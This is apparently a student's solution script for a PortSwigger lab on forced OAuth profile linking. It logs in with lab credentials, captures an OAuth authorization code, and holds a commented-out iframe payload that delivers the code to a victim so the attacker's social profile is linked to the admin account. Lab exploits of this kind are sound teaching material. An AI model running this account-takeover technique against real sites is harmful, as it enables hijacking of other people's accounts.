# Bradley Thompson
# CS595 Winter 2022 Final Project
# https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

import re
import urllib.parse
import requests
from bs4 import BeautifulSoup

from Helpers import parseArgsForSite, uploadExploit, searchResponse, checkForSiteLiveness

site = parseArgsForSite('https://ac271f0d1e444c01c0d97e4a00bf0044.web-security-academy.net/')
checkForSiteLiveness(site)
s = requests.Session()

if __name__ == "__main__":
    # Find social login link in account page
    login_url = f'https://{site}/login'
    login_form = searchResponse(resp=s.get(login_url), search_for='form')
    social_login_url = login_form.find('a', {'class': 'button'}).get('href')
    oauth_site = social_login_url.split('/')[2]
    print(f'Social login button url: {social_login_url}\noauth site: {oauth_site}\n')

    # Find sign-in page redirected to
    resp = s.get(social_login_url, allow_redirects=False)
    print(f'Social login responded with {resp.status_code}:\n{resp.text}')
    redirect_path_1 = searchResponse(resp, 'a').get('href')
    print(f'Path redirecting to: {redirect_path_1}\n')

    # Found in the following GET that the POST endpoint just appends /login to `redirect_path_1`
    # resp = s.get(f'https://{oauth_site}{redirect_path_1}')
    # print(resp.text)

    # POST sign-in data to social login w/ another user's valid login information
    resp = s.post(f'https://{oauth_site}{redirect_path_1}/login', data={
        'username': 'peter.wiener',
        'password': 'hotdog'
    })
    print(f'POST redirect_path_1/login responded with {resp.status_code}')
    resp = s.post(f'https://{oauth_site}{redirect_path_1}/confirm', allow_redirects=False)
    print(f'Confirm OAuth page responded {resp.status_code}: {resp.url}')
    # oauth code in URL of page redirected to. So grab that from the response url
    oauth_code = urllib.parse.urlparse(resp.url).query.split('=')[1]
    print(f'code found: {oauth_code}\n')

    # exploit_payload = f'''
    #     <iframe src="https://{site}/oauth-linking?code={oauth_code}"></iframe>
    # '''
    # resp = uploadExploit(s, site, exploit_payload, 'DELIVER_TO_VICTIM')
    # if resp.status_code == 200:
    #     print("Payload delivered to victim, login now.")
    # Now, in UI should be able to click "Log in with social media" and get logged in as admin.
